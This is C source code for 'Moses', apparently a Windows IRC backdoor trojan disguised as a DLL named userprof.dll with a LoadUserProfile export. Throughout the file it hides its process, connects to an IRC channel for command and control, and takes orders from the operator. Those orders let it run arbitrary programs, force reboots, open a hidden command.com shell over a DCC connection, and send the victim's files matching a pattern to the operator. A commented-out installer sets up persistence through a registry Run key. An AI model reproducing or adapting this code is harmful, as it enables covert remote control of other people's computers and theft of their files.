//  Copyright (C) 2000  Psyon.Org
//
//  Psyon.Org
//  http://www.psyon.org
//
//  This library is free software; you can redistribute it and/or
//  modify it under the terms of the GNU Lesser General Public
//  License as published by the Free Software Foundation; either
//  version 2 of the License, or (at your option) any later version.
//
//  This library is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
//  Lesser General Public License for more details.
//
//  You should have received a copy of the GNU Lesser General Public
//  License along with this library; if not, write to the Free Software
//  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

//  This file was written by:
//  Don Becker
//  psyon@psyon.org

#define MOSES_EXPORT __declspec(dllexport)

#include <windows.h>
#include <winsock.h>
#include <stdio.h>

SOCKET ircSock;
BOOL keep_alive;
char cVer[] = "v1.1.5 BETA";
char cServer[255]; 
char cPort[6];
char cHost[255];
char cIP[16];
char ircIn[1024] = "";
char ircOld[2048] = "";
char ircOut[2048] = "";
char tmpdbg[1024] = "";
char NickName[10] = "";
char UsersOn[10240] = ":";
unsigned int nickRetry = 0;

MOSES_EXPORT void LoadUserProfile(void);
BOOL InitWinsock(void);
BOOL StopWinsock(void);
BOOL RegisterService(DWORD);
HOSTENT* ResolveHost(LPSTR);
void ConnectToIRC(LPSTR, LPSTR);
void ParseIRC(LPSTR);
void ProcessIRC(LPSTR);
void sendIRC(LPSTR, ...);
void DoDebug(LPSTR, ...);
void DoPrivmsg(LPSTR, LPSTR);
void AddUser(LPSTR);
void DelUser(LPSTR);
BOOL IsUser(LPSTR);

char *GetCfgStr(char *);
int GetCfgNum(char *);
int GetCfgBool(char *);

char cfgData[] = "<**CFG**>Moses Configuration\0"
				   "B:Auto Name=1\0"
				   "S[9]:Nick Name=Moses\0...\0"
				   "S[50]:Real Name=Owned By Moses!\0..................................\0"
				   "S[10]:User Name=Moses\0....\0"
				   "S[50]:Server=irc.aohell.org\0...................................\0"
				   "N[0,65535]:Port=6667\0\0"
				   "S[20]:Password=PUBLIC\0.............\0"
				   "S[90]:Channel=#Moses\0...................................................................................\0"
				   "S[255]:Verification String=Hey did you come to free the Hebrews?\0.........................................................................................................................................................................................................................\0"
				   "S[255]:Verification Reply=Yes, I can part the waters!\0...................................................................................................................................................................................................................................\0";

FARPROC RegisterServiceProcess;
HMODULE hKernel;
BOOL RSPLoaded = FALSE;

/*****************************/
/* Bot Commands Header Start */
/*****************************/
typedef struct _ServerMsg {
	char* name;
	void (*func) (LPSTR, LPSTR);
} ServerMsg;

void cmd_execute(LPSTR, LPSTR);
void cmd_command(LPSTR, LPSTR);
void cmd_reboot(LPSTR, LPSTR);
void cmd_quit(LPSTR, LPSTR);
void cmd_msgbox(LPSTR, LPSTR);
void cmd_server(LPSTR, LPSTR);
void cmd_console(LPSTR, LPSTR);
void cmd_help(LPSTR, LPSTR);
void cmd_send(LPSTR, LPSTR);
void cmd_shutdown(LPSTR, LPSTR);
void cmd_version(LPSTR, LPSTR);
void cmd_debug(LPSTR, LPSTR);

ServerMsg BotCmds[] = {
	{"VERSION", cmd_version},
	{"EXECUTE", cmd_execute},
	{"COMMAND", cmd_command},
	{"REBOOT", cmd_reboot},
	{"SEND", cmd_send},
	{"QUIT", cmd_quit},
	{"MSGBOX", cmd_msgbox},
	{"SERVER", cmd_server},
	{"CONSOLE", cmd_console},
#ifdef _DEBUG
	{"SHUTDOWN", cmd_shutdown},
	{"DEBUG", cmd_debug},
#endif
	{"HELP", cmd_help}
};
/* Bot Commands Header End */

/************************/
/* Console Header Start */
/************************/
typedef struct _ConsoleCmd {
	char* name;
	void (*func) (SOCKET, HANDLE, HANDLE, LPSTR, LPSTR);
} CONSOLECMD;

void console_get(SOCKET, HANDLE, HANDLE, LPSTR, LPSTR);

CONSOLECMD ConsoleCmds[] = {
	{"GET", console_get}
};

unsigned _stdcall StartConsole(void *);
void ProcessConsole(SOCKET, HANDLE, HANDLE, LPSTR, LPSTR);
/* Console Header End */

/********************/
/* DCC Header Start */
/********************/
typedef struct _DccSendInfo {
	char nick[30];
	char pattern[MAX_PATH+2];
} DCCSENDINFO;

unsigned _stdcall StartDccSend(void *);
/* DCC Header End */

void DoDebug(LPSTR debugstr, ...)
{
#ifdef _DEBUG
	FILE *hFile;
	char debugOut[1024];
	va_list mylist;
	va_start(mylist, debugstr);
	wvsprintf(debugOut, debugstr, mylist);
	va_end(mylist);
	OutputDebugString(debugOut);

	hFile = fopen("c:\\moses.dbg", "a");
	fprintf(hFile, debugOut);
	fclose(hFile);
#endif
	return;
}

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//{
//	HKEY hKey;
//	char cModName[MAX_PATH];
//	char cSysDir[MAX_PATH];
//	char cInstDir[MAX_PATH];
//	char cRunCmd[255];
//
//	GetSystemDirectory(cSysDir, sizeof(cSysDir));
//	GetModuleFileName(NULL, cModName, sizeof(cModName));
//	wsprintf(cInstDir, "%s\\Userprof.dll", cSysDir);
//	CopyFile(cModName, cInstDir, FALSE);
//	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
//	RegSetValueEx(hKey, "LoadUserProfile", 0, REG_SZ, "Rundll32.exe userprof.dll,LoadUserProfile", 38);
//	wsprintf(cRunCmd, "%s,LoadUserProfile", cInstDir);
//	LoadUserProfile();
//	return 0;
//}

MOSES_EXPORT void FooBar()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	CreateProcess("rundll32.exe", "c:\\windows\\system\\userprof.dll,LoadUserProfile", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	ExitProcess(0);
}

MOSES_EXPORT void LoadUserProfile()
{
	int iSockCommand;
	fd_set wSocks, rSocks, eSocks;
	TIMEVAL tvTime;

	hKernel = LoadLibrary("kernel32.dll");
	if(hKernel != NULL) {
		RegisterServiceProcess = GetProcAddress(hKernel, "RegisterServiceProcess");
		if(RegisterServiceProcess != NULL) RSPLoaded = TRUE;
	}
	if (!RegisterService((DWORD)NULL)) DoDebug("Could not register service!\n");
	if(!InitWinsock()) return;
	strcpy(cServer, GetCfgStr("Server"));
	strcpy(cPort, GetCfgStr("Port"));
	ConnectToIRC(cServer, cPort);
	tvTime.tv_sec  = 0;
	tvTime.tv_usec = 0;
	keep_alive = TRUE;
	while (keep_alive)
	{
		FD_ZERO(&rSocks);
		FD_ZERO(&eSocks);
		FD_SET(ircSock, &rSocks);
		FD_SET(ircSock, &eSocks);
		iSockCommand = select(0, &rSocks, &wSocks, &eSocks, &tvTime);
		if (FD_ISSET(ircSock, &rSocks) != 0) {
			if(recv(ircSock, ircIn, sizeof(ircIn), 0) == 0) {
				ConnectToIRC(cServer, cPort);
			}
			ParseIRC(ircIn);
			memset(ircIn, 0, sizeof(ircIn));
		}
		//if (FD_ISSET(ircSock, &eSocks) != 0) {
		//	DoDebug("ERROR: ircSock!\n");
		//	strcpy(cServer, GetCfgStr("Server"));
		//	strcpy(cPort, GetCfgStr("Port"));
		//	ConnectToIRC(cServer, cPort);
		//}
	}
	closesocket(ircSock);
	StopWinsock();
	ExitProcess(0);
}

HOSTENT* ResolveHost(LPSTR lpHost)
{
	HOSTENT       *hp;
	unsigned long addr;
	
	addr = inet_addr(lpHost);
	if (addr != INADDR_NONE) {
		hp = gethostbyaddr((char *)&addr, 4, AF_INET);
		return hp;
	} else {
		hp = gethostbyname(lpHost);
		return hp;
	}
}

BOOL InitWinsock(void)
{
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(1,1), &wsaData) != 0) return FALSE;
	return TRUE;
}

BOOL StopWinsock(void)
{
	WSACleanup();
	return TRUE;
}

BOOL RegisterService(DWORD proc)
{
	if(!RSPLoaded) return FALSE;
	if(!RegisterServiceProcess(proc, 1)) return FALSE;
	return TRUE;
}

void ConnectToIRC(LPSTR server, LPSTR port)
{
	LPHOSTENT lpHostEntry;
	SOCKADDR_IN saIRCserv;
	int nRet;
	char cUserInfo[255];

	lpHostEntry = ResolveHost(cServer);
	if (lpHostEntry == NULL) return;
	
	closesocket(ircSock);
	ircSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (ircSock == INVALID_SOCKET) return;

	saIRCserv.sin_family = AF_INET;
	saIRCserv.sin_addr	 = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
	saIRCserv.sin_port   = htons((u_short)atoi(port));

	DoDebug("Trying to connect...\n");
	nRet = connect(ircSock, (LPSOCKADDR)&saIRCserv, sizeof(SOCKADDR_IN));
	if (nRet == SOCKET_ERROR)
	{
		closesocket(ircSock);
		return;
	}
	wsprintf(NickName, "Moses%i", nickRetry); 
	wsprintf(cUserInfo, "USER %s %s %s :%s\n", GetCfgStr("User Name"), GetCfgStr("Server"), GetCfgStr("Server"), GetCfgStr("Real Name"));
	if(GetCfgBool("Auto Name")) {
		wsprintf(NickName, "Moses%i", nickRetry);
	} else {
		wsprintf(NickName, "%s", GetCfgStr("Nick Name"));
	}
	sendIRC(cUserInfo);
	sendIRC("NICK %s\n", NickName);

	return;
}

void ParseIRC(LPSTR parsein)
{
	char *brkpos; 
	unsigned int pos;
	char *ircNew = ircOld;
	strncat(ircNew, parsein, strlen(parsein));
	while(1) {
		brkpos = strchr(ircNew, '\n');
		if(brkpos == NULL) {
			break;
		}
		pos = brkpos - ircNew;
		if (ircNew[pos-1] == 13) ircNew[pos-1] = '\0';
		ircNew[pos] = '\0';
		ProcessIRC(ircNew);
		ircNew += pos+1;
	}
	strcpy(ircOld, ircNew);
	return;
}

void ProcessIRC(LPSTR procin)
{
	char *spcpos, pCommand[512], sCommand[512], procOut[512] = "";
	int pos;
	
	DoDebug("%s\n", procin);
	
	spcpos = strchr(procin, ' ');
	pos = spcpos - procin;
	procin[pos] = '\0';
	strcpy(pCommand, procin);
	procin += pos+1;

	if (!strcmp(pCommand, "PING")) {
		procin += 1;
		sendIRC("PONG %s\n", procin);
		return;
	}
	else {
		spcpos = strchr(procin, ' ');
		pos = spcpos - procin;
		procin[pos] = '\0';
		strcpy(sCommand, procin);
		procin += pos+1;

		if (!strcmp(sCommand, "302")) {
			HOSTENT *hp;
			spcpos = strchr(procin, ':');
			pos = spcpos - procin;
			procin += pos+1;
			spcpos = strchr(procin, '=');
			pos = spcpos - procin;
			procin[pos] = '\0';
			if (!strcmp(strupr(procin), strupr(NickName))) {
				procin += pos+1;
				spcpos = strchr(procin, '@');
				pos = spcpos - procin;
				procin += pos+1;
				DoDebug("HOST = %s\n", procin);
				hp = ResolveHost(procin);
				if (hp != NULL) {
					strncpy(cHost, hp->h_name, strlen(hp->h_name));
					strcpy(cIP, inet_ntoa(*((LPIN_ADDR)*hp->h_addr_list)));
				}
				if (inet_addr(procin) != INADDR_ANY) {
					strcpy(cIP, procin);
				}
				if (strlen(cIP) <= 6) {
					gethostname(cHost, sizeof(cHost));
					hp=ResolveHost(cHost);
					if(hp != NULL) {
						strcpy(cIP, inet_ntoa(*((LPIN_ADDR)*hp->h_addr_list)));
					}
				}
				DoDebug("IP  = %s\n", cIP);
			}
		}
		if (!strcmp(sCommand, "376") || !strcmp(sCommand, "422")) {
			sendIRC("USERHOST %s\n", NickName);
			sendIRC("JOIN %s\n", GetCfgStr("Channel"));
			return;
		}
		if (!strcmp(sCommand, "433")) {
			nickRetry++;
			wsprintf(NickName, "Moses%i", nickRetry);
			sendIRC("NICK %s\n", NickName);
			return;
		}
		if (!strcmp(sCommand, "PRIVMSG")) {
			DoPrivmsg(pCommand, procin);
			return;
		}
	}
	return;
}

void sendIRC(LPSTR ircSend, ...)
{
// Can take the parameters like printf() does.
	va_list mylist;

	va_start(mylist, ircSend);
	wvsprintf(ircOut, ircSend, mylist);	
	va_end(mylist);
	send(ircSock, ircOut, strlen(ircOut), 0);
	return;
}

void DoPrivmsg(LPSTR sender, LPSTR privmsg)
{
	char recpt[100], *spcpos, command[30] = "";
	int pos;
	
	sender++;
	spcpos = strchr(sender, '!');
	pos = spcpos - sender;
	sender[pos] = '\0';

	spcpos = strchr(privmsg, ' ');
	pos = spcpos - privmsg;
	privmsg[pos] = '\0';
	strcpy(recpt, privmsg);
	privmsg += pos+2;
	

	if (!strchr(recpt, '#') && !strchr(recpt, '&')) {

		if (!strcmp(privmsg, GetCfgStr("Verification String"))) {
			sendIRC("PRIVMSG %s :%s\n", sender, GetCfgStr("Verification Reply"));
		}

		spcpos = strchr(privmsg, ' ');
		if (spcpos != NULL) {
			pos = spcpos - privmsg;
			privmsg[pos] = '\0';
			strncpy(command, privmsg, sizeof(command));
			privmsg += pos+1;
			
		} else {
			strncpy(command, privmsg, sizeof(command));
			privmsg[0] = '\0';
		}
		if(!strcmp(strupr(command), "\1LOGIN")) {
			if(strcmp(strupr(GetCfgStr("Password")), "PUBLIC")) {
				spcpos = strchr(privmsg, '\1');
				if(spcpos != NULL) {
					pos = spcpos - privmsg;
					privmsg[pos] = '\0';
				}
				if(!strcmp(privmsg, GetCfgStr("Password"))) {
					if(!IsUser(sender)) {
						AddUser(sender);
						sendIRC("PRIVMSG %s :You are now logged in!\n", sender);
					} else { 
						sendIRC("PRIVMSG %s :You are already logged in!\n", sender);
					}
				} 
			} 
		}
		if(IsUser(sender) || !strcmp(strupr(GetCfgStr("Password")), "PUBLIC")) {
			int i, nBotCmds = sizeof(BotCmds)/sizeof(ServerMsg);
			for(i = 0; i < nBotCmds; i++) {
				if(!strcmp(BotCmds[i].name, strupr(command))) {
					BotCmds[i].func(sender, privmsg);
					break;
				}
			}
		}
	}
}

void AddUser(LPSTR user)
{
	char newuser[100];
	strcpy(newuser, user);
	strcat(UsersOn, strupr(newuser));
	strcat(UsersOn, ":");
}

void DelUser(LPSTR user)
{
	int pos, end;
	char *loc, *pUsersOn = UsersOn;
	char olduser[100];
	strcpy(olduser, user);
	strcat(olduser, ":");
	loc = strstr(pUsersOn, strupr(olduser));
	if(loc != NULL) {
		pos = loc - pUsersOn;
		end = pos + strlen(olduser);
		pUsersOn[pos] = '\0';
		pUsersOn += end+1;
		strcat(UsersOn, pUsersOn);
	}
}

BOOL IsUser(LPSTR user)
{
	char chkUser[30];
	wsprintf(chkUser, ":%s:", strupr(user));
	if(strstr(UsersOn, chkUser) != NULL) {
		return TRUE;
	}
	return FALSE;
}

char *GetCfgStr(char *key)
{
	char *str;
	char *pb;
	int nLen2;
	
	str=cfgData;

	while(*str!='\0') str++;
	str++;
	while(*str!='\0') {
		int nLen;
		if(*str=='B') {
			nLen=1;
			str+=2;
			if(strncmp(str,key,lstrlen(key))==0) break;
		} else if(*str=='S') {
			str+=2;
			nLen=atoi(str);
			while(*str!=']') str++;
			str+=2;
			if(strncmp(str,key,lstrlen(key))==0) break;
		} else if(*str=='N') {
			str+=2;
			pb=str;
			while(*str!=',') str++;
			nLen=(DWORD)str-(DWORD)pb;
			str++;
			pb=str;
			while(*str!=']') str++;
			nLen2=(DWORD)str-(DWORD)pb;
			if(nLen2>nLen) nLen=nLen2;
			str+=2;
			if(strncmp(str,key,lstrlen(key))==0) break;
		}
		while(*str!='=') str++;
		str++;
		str+=(nLen+1);
	}
	if(*str!='\0') {
		while(*str!='=') str++;
		return str+1;
	}
	return NULL;
}

int GetCfgNum(char *key)
{
	char *str;
	str=GetCfgStr(key);
	return (str==NULL)?0:atoi(str);
}

int GetCfgBool(char *key)
{
	return GetCfgNum(key)?TRUE:FALSE;
}

/********************************/
/* Bot Commands Functions Start */
/********************************/
void cmd_command(LPSTR sender, LPSTR indata)
{
	sendIRC("%s\n", indata);
}

void cmd_quit(LPSTR sender, LPSTR indata)
{
	sendIRC("QUIT :%s\n", indata);
}

void cmd_reboot(LPSTR sender, LPSTR indata)
{
	sendIRC("QUIT :%s\n", indata);
	keep_alive = FALSE;
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

void cmd_execute(LPSTR sender, LPSTR indata)
{
	char execCmd[255], *spcpos;
	int pos;

	spcpos = strchr(indata, ' ');
	if(spcpos != NULL) {
		pos = spcpos - indata;
		indata[pos] = '\0';
		strcpy(execCmd, indata);
		indata += pos+1;
		ShellExecute(NULL, NULL, execCmd, indata, "c:\\", SW_SHOWNORMAL);
	} else {
		ShellExecute(NULL, NULL, indata, NULL, "C:\\", SW_SHOWNORMAL);
	}
}

void cmd_msgbox(LPSTR sender, LPSTR indata)
{
	MessageBox(NULL, indata, "Error!", MB_OK | MB_TOPMOST);
}

void cmd_server(LPSTR sender, LPSTR indata)
{
	char *spcpos, server[255];
	int pos;

	if(indata != NULL) {
		spcpos = strchr(indata, ' ');
		if (spcpos != NULL) {
			pos = spcpos - indata;
			indata[pos] = '\0';
			strcpy(server, indata);
			indata += pos+1;
			spcpos = strchr(indata, ' ');
			if (spcpos != NULL) {
				pos = spcpos - indata;
				indata[pos] = '\0';
			} 
			strcpy(cServer, server);
			strncpy(cPort, indata, sizeof(cPort)-1);
		} else {
			strcpy(cServer, indata);
		}
		sendIRC("QUIT :Changing server to: %s\n", cServer);
	}
}

void cmd_console(LPSTR sender, LPSTR indata)
{
	DWORD threadAddr;
	static char nick[100];
	memset(nick, 0, sizeof(nick));
	strncpy(nick, sender, strlen(sender));
	CreateThread(NULL, 0, StartConsole, nick, 0, &threadAddr);
}

void cmd_help(LPSTR sender, LPSTR indata)
{
	int i, nBotCmds = sizeof(BotCmds)/sizeof(ServerMsg);
	sendIRC("PRIVMSG %s :You may use the following commands:\n", sender);
	sendIRC("PRIVMSG %s :", sender);
	for(i = 0; i < nBotCmds; i++) {
		sendIRC("%s ", BotCmds[i].name);
	}
	sendIRC("\n");
}

void cmd_shutdown(LPSTR sender, LPSTR indata)
{
	keep_alive = FALSE;
}

void cmd_version(LPSTR sender, LPSTR indata)
{
	sendIRC("PRIVMSG %s :Moses %s by Exodus, BlueNexus, and Almighty!\n", sender, cVer);
}

void cmd_send(LPSTR sender, LPSTR indata)
{
	DWORD threadAddr;
	static DCCSENDINFO dsi;
	strcpy(dsi.nick, sender);
	strcpy(dsi.pattern, indata);
	CreateThread(NULL, 0, StartDccSend, &dsi, 0, &threadAddr);
}

void cmd_debug(LPSTR sender, LPSTR indata)
{
	char *debug;
	
	debug = malloc(300);
	free(debug);
}
/* Bot Commands Functions End */

/***************************/
/* Console Functions Start */
/***************************/
unsigned _stdcall StartConsole(void *indata)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SOCKET consoleSock;
	SOCKADDR_IN sai;
	char *brk, buffer[512], *conParse, conOld[2048];
    SECURITY_ATTRIBUTES sa;
	HANDLE hServerInputPipe,hNetworkRecvPipe;
	HANDLE hServerOutputPipe,hNetworkSendPipe;
	DWORD dwLen,dwBytes;
	fd_set rfds;
	int i;
	TIMEVAL tm;

	sa.bInheritHandle       = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength              = sizeof(SECURITY_ATTRIBUTES);

	// Create Pipe for server input <- network recv
	if(!CreatePipe(&hServerInputPipe, &hNetworkRecvPipe, &sa, 0)) {
		goto end_of_thread;
		return 0;
	}

	// Create Pipe for server output -> network send
	if(!CreatePipe(&hNetworkSendPipe, &hServerOutputPipe, &sa, 0)) {
		goto end_of_thread;
		return 0;
	}
	
	//Start Command.com for console shell!
	memset(&si, 0, sizeof(STARTUPINFO));

	si.cb          = sizeof(STARTUPINFO);
	si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
	si.wShowWindow = SW_HIDE;
	si.hStdError   = hServerOutputPipe;
	si.hStdInput   = hServerInputPipe;
	si.hStdOutput  = hServerOutputPipe;
	
	if(!CreateProcess(NULL, "command.com", NULL, NULL, TRUE, CREATE_SEPARATE_WOW_VDM, NULL, NULL, &si, &pi)) {
		DoDebug("Could not start command.com\n");
		goto end_of_thread;
	}
	
	consoleSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (consoleSock == INVALID_SOCKET) {
		goto end_of_thread;
	}
	sai.sin_addr.s_addr = INADDR_ANY;
	sai.sin_family = AF_INET;
	sai.sin_port = 0;
	if (bind(consoleSock, (LPSOCKADDR)&sai, sizeof(sai)) == SOCKET_ERROR) {
		goto end_of_thread;
	}
	if (listen(consoleSock, SOMAXCONN) == SOCKET_ERROR) {
		goto end_of_thread;
	}
	i = sizeof(sai);
	getsockname(consoleSock, (LPSOCKADDR)&sai, &i);
	sendIRC("NOTICE %s :DCC CHAT (%s)\n", indata, cIP);
	sendIRC("PRIVMSG %s :\1DCC CHAT chat %lu %i\1\n", indata, htonl(inet_addr(cIP)), ntohs(sai.sin_port));
	consoleSock = accept(consoleSock, (LPSOCKADDR)&sai, &i);
	if (consoleSock == INVALID_SOCKET) {
		DoDebug("Console could not Accept() socket!\n");
		goto end_of_thread;
	}
	memset(conOld, 0, sizeof(conOld));
	
	//Start forwarding packets to and from the pipes and socket
	while(1) {
		// Check network socket
		Sleep(20);
		FD_ZERO(&rfds);
		FD_SET(consoleSock,&rfds);
		tm.tv_sec=0;
		tm.tv_usec=0;
		if(select(0,&rfds,NULL,NULL,&tm)>0) {		
			if(FD_ISSET(consoleSock,&rfds)) {
				ioctlsocket(consoleSock,FIONREAD,&dwLen);
				if(dwLen <= 0) {
					break;
				}
				memset(buffer, 0, sizeof(buffer));
				recv(consoleSock, buffer, dwLen,0);
				strncat(conOld, buffer, strlen(buffer));
				conParse = conOld;
				brk = strchr(conParse, '\n');
				if (brk != NULL) {
					i = brk - conParse;
					conParse[i] = '\0';
					ProcessConsole(consoleSock, hNetworkRecvPipe, pi.hProcess, indata, conParse);
					conParse += i+1;
					strcpy(conOld, conParse);
				}
				//brk = strchr(buffer, 13);
				//if (brk == NULL) {
				//	brk = strchr(buffer, 10);
				//    if (brk != NULL) {
				//		strset(brk, 13);
				//  }
				//}
				//if(dwLen>0) WriteFile(hNetworkRecvPipe,buffer,dwLen,&dwBytes,NULL);
				memset(buffer, 0, sizeof(buffer));
			}	
		}

		//Check Pipe for data from command.com
		PeekNamedPipe(hNetworkSendPipe, NULL, 0, NULL, &dwLen, NULL);
		if(dwLen > 0) {
			memset(buffer, 0, sizeof(buffer));
			ReadFile(hNetworkSendPipe, buffer, sizeof(buffer), &dwBytes, NULL);
			DoDebug("CONSOLE -> %s\n", buffer);
			send(consoleSock,buffer, dwBytes, 0);	
		}
		
		//Verify that command.com is still running
		if(WaitForSingleObject(pi.hProcess, 0) != WAIT_TIMEOUT) {
			break; 
		}
	}
end_of_thread:
	CloseHandle(hNetworkSendPipe);
	CloseHandle(hServerOutputPipe);
	CloseHandle(hNetworkRecvPipe);
	CloseHandle(hServerInputPipe);
	closesocket(consoleSock);
	TerminateProcess(pi.hProcess, 0);
	//free(indata);
	ExitThread(0);
	return 0;
}

void ProcessConsole(SOCKET s, HANDLE hDataPipe, HANDLE hConsoleProcess, LPSTR sender, LPSTR indata)
{
	char *brk, command[31];
	int i, pos, nConsoleCmds = sizeof(ConsoleCmds)/sizeof(CONSOLECMD);
	DWORD dwBytes;
	BYTE CrLf[2];

	memset(&CrLf[0], 13, 1);
	memset(&CrLf[1], 10, 1);
	memset(command, 0, sizeof(command));
	brk = strchr(indata, ' ');
	if (brk != NULL) {
		pos = brk - indata;
		if (pos < 30) strncpy(command, indata, pos);
	} else if (strlen(indata) < 30) {
		strncpy(command, indata, strlen(indata));
		pos = 0;
	}
	for(i = 0; i < nConsoleCmds; i++) {
		if(!strcmp(strupr(command), ConsoleCmds[i].name)) {
			if (pos > 0) indata += pos+1;
			ConsoleCmds[i].func(s, hDataPipe, hConsoleProcess, sender, indata);
			break;
		}
	}
	if (i >= nConsoleCmds) {
		WriteFile(hDataPipe, indata, strlen(indata), &dwBytes, NULL);
		if (dwBytes > 0) DoDebug("CONSOLE <- %s (%lu bytes)\n", indata, dwBytes);
		WriteFile(hDataPipe, CrLf, sizeof(CrLf), &dwBytes, NULL);
	}
	return;
}

void console_get(SOCKET s, HANDLE hDataPipe, HANDLE hConsoleProcess, LPSTR sender, LPSTR indata)
{
	char getOut[] = "Get received alright! Functions working OK!\n";

	DoDebug(getOut);
	send(s, getOut, strlen(getOut), 0);
}

/* Console Functions End */

/***********************/
/* DCC Functions Start */
/***********************/
unsigned _stdcall StartDccSend(void *indata)
{
	DCCSENDINFO *dsi = (DCCSENDINFO *)indata;
	HANDLE hFindFile;
	WIN32_FIND_DATA wfd;
	char *spcpos, *DccFiles[251], DccPath[MAX_PATH+2];
	int i, count = 0;
   
	hFindFile = FindFirstFile(dsi->pattern, &wfd);
	while(hFindFile != INVALID_HANDLE_VALUE) {
		if(!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			DccFiles[count] = malloc(strlen(wfd.cFileName)+1);
			strcpy(DccFiles[count], strlwr(wfd.cFileName));
			count++;
			if (count > 249) {
				break;
			}
		}
		if(!FindNextFile(hFindFile, &wfd)) break;
	}
	DccFiles[count] = NULL;
	if (count > 249) {
		sendIRC("PRIVMSG %s :More than 250 files were found... Sending first 250!", dsi->nick);
	} else {
		sendIRC("PRIVMSG %s :%i File(s) found matching %s\n", dsi->nick, count, dsi->pattern);
	}
	FindClose(hFindFile);
	
	spcpos = strrchr(dsi->pattern, '\\');
	if (spcpos != NULL) {
		int pos;
		pos = spcpos - dsi->pattern;
		dsi->pattern[pos+1] = '\0';
		strcpy(DccPath, strlwr(dsi->pattern));
	} else {
		strcpy(DccPath, "");
	}

	i = 0;
	while (DccFiles[i] != NULL) {
		DWORD bytesRead, bytesSent = 0, DccCurFileSize;
		char send_buffer[1024], DccCurFile[MAX_PATH+2];
		HANDLE sendFile;
		SOCKET dccSock;
		SOCKADDR_IN sai;
		FD_SET dccFDS;
		TIMEVAL dccTV;
		int sai_size;

		wsprintf(DccCurFile, "%s%s", DccPath, DccFiles[i]);
		sendFile = CreateFile(DccCurFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (sendFile == INVALID_HANDLE_VALUE) {
			sendIRC("PRIVMSG %s :Error sending file %i: %s\n", dsi->nick, i+1, DccCurFile);
			closesocket(dccSock);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		DccCurFileSize = GetFileSize(sendFile, NULL);
		sendIRC("PRIVMSG %s :Sending file %i of %i: %s\n", dsi->nick, i+1, count, DccCurFile);
		dccSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (dccSock == INVALID_SOCKET) {
			sendIRC("PRIVMSG %s :Error sending file %i: %s\n", dsi->nick, i+1, DccCurFile);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		sai.sin_addr.s_addr = INADDR_ANY;
		sai.sin_family = AF_INET;
		sai.sin_port = 0;
		if (bind(dccSock, (LPSOCKADDR)&sai, sizeof(sai)) == SOCKET_ERROR) {
			sendIRC("PRIVMSG %s :Error sending file %i: %s\n", dsi->nick, i+1, DccCurFile);
			closesocket(dccSock);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		if (listen(dccSock, SOMAXCONN) == SOCKET_ERROR) {
			sendIRC("PRIVMSG %s :Error sending file %i: %s\n", dsi->nick, i+1, DccCurFile);
			closesocket(dccSock);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		sai_size = sizeof(sai);
		getsockname(dccSock, (LPSOCKADDR)&sai, &sai_size);
		sendIRC("NOTICE %s :DCC Send %s (%s)\n", dsi->nick, DccFiles[i], cIP);
		sendIRC("PRIVMSG %s :\1DCC SEND \"%s\" %lu %i %lu\1\n", dsi->nick, DccFiles[i], htonl(inet_addr(cIP)), ntohs(sai.sin_port), DccCurFileSize);
	
		FD_ZERO(&dccFDS);
		FD_SET(dccSock, &dccFDS);
		dccTV.tv_sec = 180;
		dccTV.tv_usec = 0;
		if(select(0, &dccFDS, NULL, NULL, &dccTV) == 0) {
			sendIRC("PRIVMSG %s :DCC timed out for file %i: %s\n", dsi->nick , i+1, DccCurFile);
			closesocket(dccSock);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		dccSock = accept(dccSock, (LPSOCKADDR)&sai, &sai_size);
		if (dccSock == INVALID_SOCKET) {
			sendIRC("PRIVMSG %s :Error sending file %i: %s\n", dsi->nick, i+1, DccCurFile);
			closesocket(dccSock);
			free(dsi);
			ExitThread(0);
			return 0;
		}
		
		while (ReadFile(sendFile, send_buffer, sizeof(send_buffer), &bytesRead, NULL) != 0) {
			if (bytesRead == 0) break;
			send(dccSock, send_buffer, bytesRead, 0);
			bytesSent += bytesRead;
			memset(send_buffer, 0, sizeof(send_buffer));
			recv(dccSock, send_buffer, bytesRead, 0);
			memset(send_buffer, 0, sizeof(send_buffer));
		}
		if (bytesSent >= DccCurFileSize) {
			BYTE endSend[1];
			memset(endSend, 0, sizeof(endSend));
			send(dccSock, endSend, sizeof(endSend), 0);
		}
		closesocket(dccSock);
		i++;
	}

	sendIRC("PRIVMSG %s :%i File(s) sent successfully!\n", dsi->nick, i);
	//free(dsi);
	ExitThread(0);
	return 0;
}
/* DCC Functions End */
